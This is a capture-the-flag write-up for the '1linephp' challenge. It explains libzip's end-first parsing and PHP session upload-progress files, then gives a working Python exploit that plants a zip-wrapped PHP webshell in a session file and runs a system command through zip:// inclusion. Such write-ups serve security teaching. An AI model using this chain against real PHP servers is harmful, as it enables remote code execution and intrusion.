## 1linephp

#### solution

##### zip

The zip extension of PHP uses the libzip library. By reading the source code of libzip, you can find that the way to parse the zip file is from the end to the beginning. First, search for the MAGIC of EOCD at the end of the file, and then read CDH according to the EOCD offset , and finally read the compressed file data according to the offset in CDH.

This way of parsing makes it possible to insert extra data at the beginning and the end of the zip. Just fix the two offsets accordingly to allow libzip to parse normally.

If the ZIP_CHECKCONS option flag is passed to zip_open, the check during parsing will be stricter.

###### Note

Fix offset using *zip* tool: https://github.com/perfectblue/ctf-writeups/tree/master/2021/0ctf-2021-quals/onelinephp

Some contestants found that they can get some useful information by search:

- https://gynvael.coldwind.pl/?id=523
- http://roverdoge.top

##### session

PHP_SESSION_UPLOAD_PROGRESS: https://www.php.net/manual/zh/session.upload-progress.php

session.save_path: https://www.php.net/manual/zh/session.configuration.php#ini.session.save-path

Using this feature, you can insert a piece of controllable data into a session file with a controllable file name. The specific details have been analyzed in many articles and will not be repeated here.

In addition to time race, a more stable method can also be used.

> When the [session.upload_progress.enabled](https://www.php.net/manual/en/session.configuration.php#ini.session.upload-progress.enabled) INI option is enabled, PHP will be able to track the upload progress of individual files being uploaded.

As long as the file upload is slower, you can keep the upload progress information in the session file longer, see exp for details.

##### CcL's exp

```python
import requests
import socket

port = 50081
php_session_id = "dd9c6236c439f75b78cf6ef8d1efca31"
payload = b"ccl_PK\x03\x04\x14\x00\x00\x00\x08\x00\xe5Q\xd9Rs\xaei\xe7\x1d\x00\x00\x00 \x00\x00\x00\x0b\x00\x1c\ x00include.phpUT\t\x00\x03-<\xd5`-<\xd5`ux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00s\xb0\xb1 /\xc8(PHM\xce\xc8WP\x89ww\r\x896\x88\xd5\x800\x0cc5\xad\xb9\x00PK\x01\x02\x1e\x03\x14\x00\x00\x00\x08\x00\ xe5Q\xd9Rs\xaei\xe7\x1d\x00\x00\x00 \x00\x00\x00\x0b\x00\x18\x00\x00\x00\x00\x00\x01\x00\x00\x00\xa4\x81\ x14\x00\x00\x00include.phpUT\x05\x00\x03-<\xd5`ux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00PK\x05\ x06\x00\x00\x00\x00\x01\x00\x01\x00Q\x00\x00\x00v\x00\x00\x00\x00\x00"


def exp():
    res = requests.get(
        f"http://111.186.59.2:{port}/",
        params={
            "yxxx": f"zip:///tmp/sess_{php_session_id}#include",
            "0": "system",
            "1": "cat /dd810fc36330c200a_flag/flag",
        },
    )
    print(res.text)


def build_http_request_packet(req: requests.PreparedRequest):
    packet = b""
    packet += f"{req.method} {req.path_url} HTTP/1.1\r\n".encode()
    for header, value in req.headers.items():
        packet += f"{header}: {value}\r\n".encode()
    packet += b"\r\n"
    if req.body is not None:
        if "Content-Length" in req.headers:
            if type(req.body) is str:
                packet += req.body.encode()
            else:
                packet += req.body
        else:
            for part in req.body:
                packet += f"{len(part):x}\r\n".encode()
                packet += f"{part}\r\n".encode()
            packet += b"0\r\n\r\n"
    return packet


def do_so():
    req = requests.Request(
        "POST",
        f"http://111.186.59.2:{port}/",
        headers={"Host": f"111.186.59.2:{port}"},
        cookies={"PHPSESSID": php_session_id},
        data={
            "PHP_SESSION_UPLOAD_PROGRESS": payload,
        },
        files={"file": ("simple.txt", b"ccl" * 4096)},
    )
    packet = build_http_request_packet(req.prepare())
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("111.186.59.2", port))
    s.sendall(packet[:-8])
    exp()
    s.sendall(packet[-8:])
    s.close()


if __name__ == "__main__":
    do_so()
```

#### unintended solution

Delete the first 16 bytes of the zip file and use it as the payload.

The content of the session file in the expected solution is a 16-byte prefix + zip with offset fixed + suffix.

The content of the session file in the unexpected solution is the 16-byte prefix + zip with the first 16 bytes removed + suffix .

##### why?

By reading the source code of libzip, it can be found that when reading the file in the zip, it first finds the position of the LFH according to the offset in the CDH, and then does not parse the entire content in the LFH block, but directly reads the file name length and extra field length according to the relative offset, use the sum of these two values and 30 as the offset of the compressed data, and read the compressed data directly.

Therefore, in this challenge, the first 16 bytes of the file are useless to libzip and can be replaced by any value.